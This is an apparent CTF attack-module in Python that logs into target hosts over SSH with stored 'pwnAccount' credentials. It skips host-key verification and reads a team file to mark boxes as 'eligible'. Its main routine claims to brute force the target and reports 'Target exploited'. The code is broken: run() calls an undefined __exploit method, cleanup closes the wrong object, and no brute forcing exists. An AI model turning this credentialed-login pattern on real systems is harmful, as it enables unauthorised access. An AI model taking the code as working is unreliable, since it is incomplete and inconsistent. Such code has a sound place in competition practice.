#!/usr/bin/env python3

import argparse
import paramiko

from ..const import pwnAccount, ssh

import logging

log = logging.getLogger(__name__)


class SSH:
    def __init__(self):
        self.__host = None
        self.__port = 22
        self.__magicfile = "/home/btv/ctf_name.txt"
        self.__ssh = paramiko.SSHClient()

    def service(self, host, port=None):
        self.__host = host
        if port:
            self.__port = port
        log.debug(
            f"[+] Checking box for further testing via service account ({self.__host})"
        )
        try:
            self.__ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.__ssh.connect(
                self.__host, username=pwnAccount.user, password=pwnAccount.password
            )
            log.debug(f"[+] Attempting to read team data. ({self.__host})")
            stdin, stdout, stderr = self.__ssh.exec_command(f"cat {self.__magicfile}")
            team = str(stdout.read(), "utf-8")
            log.debug(f"[+] `cat`: {team}")
            if len(team) > 5:
                log.info(f"[!] {self.__host} is eligible")
                return self.__host
        except Exception as e:
            log.debug(f"[!] Box not available: {e} ({self.__host})")

        finally:
            try:
                ssh.close()
            except:
                pass

    def run(self, host, port=None):
        self.__host = host
        log.info(f"[*] Attempting SSH login ({self.__host})")
        if port:
            self.__port = port
        return self.__exploit()


def main(args):
    log.info("[+] SSH module by xentrick")
    log.info(f"[+] Brute forcing {args.host}:{args.port}")

    exploit = SSH()
    if exploit.run(args.host, int(args.port)):
        log.info("Target exploited")
    else:
        log.info("Exploit failed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True)
    args = parser.parse_args()

    main(args)
